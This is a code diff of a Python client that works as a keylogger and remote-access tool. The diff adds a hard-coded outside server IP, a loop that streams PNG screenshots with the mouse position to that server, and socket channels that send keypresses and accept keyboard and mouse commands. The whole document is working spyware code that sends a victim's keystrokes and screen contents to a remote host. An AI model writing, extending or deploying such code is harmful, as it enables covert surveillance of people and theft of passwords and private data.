@@ -1,12 +1,25 @@
+import struct
+
 import keyboard
 import socket
 import sys
+
+import pyautogui
 from PIL import ImageGrab
 import time
 import io
 import win32api
 import json
-host = '127.0.0.1'
+server_ip = '172.49.11.100'
+def recvall(sock, count):
+    buf = b''
+    while count:
+        newbuf = sock.recv(count)
+        if not newbuf: return None
+        buf += newbuf
+        count -= len(newbuf)
+    return buf
+
 def send_message_to_server(client_socket,message):
     print("Sending")
     client_socket.sendall(message.encode())
@@ -14,36 +27,33 @@ def print_pressed_keys(key, client_socket):
     print("Pressed: ", key.name)
     message = f"Key pressed: {key.name}"
     send_message_to_server(client_socket,message)
-def return_image_size(image):
-    image_data = io.BytesIO()
-    image.save(image_data, format='PNG')
-    image_size = image_data.tell()
-    image_data.close()
-    return str(image_size)
+
 def send_screenshot():
     port = 5003
-    # Create a TCP/IP socket
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        # Connect to the server
-    client_socket.connect((host, port))
-
+    client_socket.connect((server_ip, port))
+    # Create a TCP/IP socket
     while True:
-            # Take a screenshot using PIL
-         screenshot = ImageGrab.grab()
-         image_data = io.BytesIO()
-         screenshot.save(image_data, format='JPEG')
-         image_data = image_data.getvalue()
-         # Send the screenshot to the server
-         client_socket.sendall(return_image_size(image_data).encode())
-         client_socket.sendall(image_data)
+        # Capture screenshot
+        screenshot = pyautogui.screenshot()
 
-            # Wait for some time before taking the next screenshot
-         time.sleep(5)
-#send_screenshot() #run screenshot fucntion
+        # Get mouse position
+        mouse_pos = pyautogui.position()
+
+        # Convert the screenshot to a byte array
+        bio = io.BytesIO()
+        screenshot.save(bio, format="PNG")
+        b = bio.getvalue()
+
+        # Send mouse position, length of byte array and byte array
+        data = struct.pack('!II', mouse_pos[0], mouse_pos[1]) + struct.pack('!I', len(b)) + b
+        client_socket.sendall(data)
+
+
 def keyboard_controlled():
     port = 5001
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((host,port))
+    s.connect((server_ip,port))
     print("Connected with server")
     while True:
         key = s.recv(1024).decode()
@@ -59,7 +69,7 @@ def mouse_controlled():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     data = "test"
     data = data.encode()
-    s.sendto(data,(host,port))
+    s.sendto(data,(server_ip,port))
     print("Sent message to server")
     s.settimeout(5)
     try: 
@@ -86,7 +96,7 @@ def keylogger():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     port = 5000
     connection_successful = False
-    s.connect((host, port))
+    s.connect((server_ip, port))
     print("Connected")
     connection_successful = True
     def on_key_pressed(key):
@@ -101,7 +111,8 @@ def keylogger():
 def main():
     #keylogger()
     #keyboard_controlled()
-    mouse_controlled()
+    #mouse_controlled()
+    send_screenshot()
 if __name__ == "__main__":
     main()   
 
